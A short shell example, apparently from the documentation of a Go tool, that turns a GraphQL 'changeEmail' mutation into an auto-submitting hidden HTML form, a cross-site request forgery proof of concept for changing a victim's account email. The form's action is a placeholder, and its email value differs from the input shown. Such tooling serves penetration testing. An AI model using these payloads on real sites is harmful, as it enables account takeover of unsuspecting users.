```shell
$ echo '{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"hacker@hacker.com"}}}' | go run main.go

<form method="POST" action="TODO">
  <input type="hidden" name="query" value="
    mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }
">
  <input type="hidden" name="variables" value="{&#34;input&#34;:{&#34;email&#34;:&#34;b@b.com&#34;}}">
  <input type="hidden" name="operationName" value="changeEmail">
</form>
<script>
  document.querySelector("form").submit();
</script>
```
